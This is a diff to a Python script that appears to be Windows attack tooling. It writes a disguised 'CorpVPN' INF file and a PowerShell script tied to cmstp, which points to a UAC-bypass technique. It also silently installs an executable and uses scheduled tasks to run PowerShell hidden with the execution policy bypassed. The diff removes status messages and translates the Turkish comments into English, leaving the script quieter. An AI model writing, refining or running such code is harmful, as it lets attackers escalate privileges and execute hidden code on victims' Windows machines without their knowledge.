@@ -40,7 +40,6 @@ def create_inf_file():
     with open(inf_file_path, 'w') as f:
         f.write(inf_content)
 
-    print(f"CorpVPN INF file created: {inf_file_path}")
     return inf_file_path
 
 def create_a_ps1():
@@ -132,76 +131,57 @@ Set-WindowActive cmstp
     with open(a_ps1_path, 'w') as f:
         f.write(ps_code)
 
-    print(f'a.ps1 dosyası başarıyla oluşturuldu: {a_ps1_path}')
     return a_ps1_path
 
 def main():
-    # Eski görevleri sil
-    print("Eski görevleri siliyor...")
+    # Delete old tasks
     run_command('schtasks /delete /tn "InstallRequests" /f')
     run_command('schtasks /delete /tn "RunPowerShellScript" /f')
 
-    # Python'un yüklü olup olmadığını kontrol et
-    print("Python'un yüklü olup olmadığını kontrol ediyor...")
-    returncode, _, _ = run_command("python --version")
+    # Check if Python is installed
+    returncode, stdout, stderr = run_command("python --version")
     if returncode != 0:
-        # Python yüklü değil. Python kurulumu başlatılıyor...
-        print("Python yüklü değil. Python kurulumu başlatılıyor...")
-        returncode, _, stderr = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
+        # Python is not installed. Start Python installation...
+        returncode, stdout, stderr = run_command('first.exe /quiet InstallAllUsers=0 PrependPath=1')
         if returncode != 0:
-            # Python kurulumu başarısız oldu. Lütfen elle kurulum yapın.
-            print(f"Python kurulumu başarısız oldu: {stderr}")
             sys.exit(1)
         else:
-            print("Python başarıyla kuruldu.")
+            pass
     else:
-        print("Python zaten yüklü.")
+        pass
 
-    # Görev Zamanlayıcı'ya yeni bir görev ekle
-    print("Yeni görev ekleniyor...")
+    # Create and schedule install_requests.py
     temp_dir = os.getenv('TEMP')
     script_path = os.path.join(temp_dir, 'install_requests.py')
-
-    # install_requests.py dosyasını oluştur
     with open(script_path, 'w') as script_file:
         script_file.write("import subprocess\n")
         script_file.write("subprocess.check_call(['python', '-m', 'pip', 'install', 'requests'])\n")
 
-    # install_requests.py dosyasını çalıştır
-    returncode, _, stderr = run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st 00:00 /f')
+    returncode, stdout, stderr = run_command(f'schtasks /create /tn "InstallRequests" /tr "python {script_path}" /sc once /st 00:00 /f')
     if returncode != 0:
-        print(f"Görev Zamanlayıcı'ya görev eklenemedi: {stderr}")
+        print(f"Failed to create task 'InstallRequests': {stderr}")
         sys.exit(1)
 
-    print("Görev başarıyla eklendi ve çalıştırıldı.")
-    # Görevi hemen çalıştır
+    # Run the task
     run_command('schtasks /run /tn "InstallRequests"')
 
-    # Görev çalıştıktan sonra script dosyasını temizle
+    # Wait for task completion or timeout, then clean up
     time.sleep(10)
     os.remove(script_path)
 
-    # a.ps1 dosyasını oluştur
+    # Create and schedule PowerShell script
     a_ps1_path = create_a_ps1()
-
-    # Temp klasöründe bulunan a.ps1 dosyasını çalıştırmak için yeni bir görev ekle
     if os.path.exists(a_ps1_path):
-        print("a.ps1 çalıştırmak için yeni görev ekleniyor...")
-        returncode, _, stderr = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {a_ps1_path}" /sc once /st 00:00 /f')
+        returncode, stdout, stderr = run_command(f'schtasks /create /tn "RunPowerShellScript" /tr "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {a_ps1_path}" /sc once /st 00:00 /f')
         if returncode != 0:
-            print(f"a.ps1 görev eklenemedi: {stderr}")
+            print(f"Failed to create task 'RunPowerShellScript': {stderr}")
             sys.exit(1)
-        
-        # Görevi hemen çalıştır
         run_command('schtasks /run /tn "RunPowerShellScript"')
-        print("a.ps1 başarıyla çalıştırıldı.")
     else:
-        print("a.ps1 dosyası bulunamadı.")
+        print("PowerShell script file does not exist.")
 
-    # INF dosyasını oluştur
+    # Create INF file if necessary
     inf_file_path = create_inf_file()
-
-    print("İşlem tamamlandı.")
 
 if __name__ == "__main__":
     main()
